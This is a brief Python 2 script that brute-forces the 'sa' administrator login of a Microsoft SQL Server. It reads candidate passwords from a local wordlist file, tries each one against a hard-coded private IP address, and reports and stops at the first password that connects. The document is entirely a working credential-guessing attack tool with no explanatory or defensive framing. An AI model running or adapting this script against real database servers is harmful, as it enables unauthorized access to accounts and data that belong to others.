import pymssql,os,socket,thread,time

def dict(ip):
	f = open('/root/dict.txt','r')
	fpasswd = f.readlines()
	for passwd in fpasswd:
		mssql(ip,passwd.strip())

def mssql(ip,passwd):
	try:
		con=pymssql.connect(host=ip,user='sa',password=passwd,timeout=1,login_timeout=1)
		print ip,'connect ok and','password:'+str(passwd),'ok'
		con.close()
		os._exit(0)
	except:
		print ip,'connect down or',passwd,'error'

if __name__ == '__main__':
	ip='192.168.1.147'
	dict(ip)
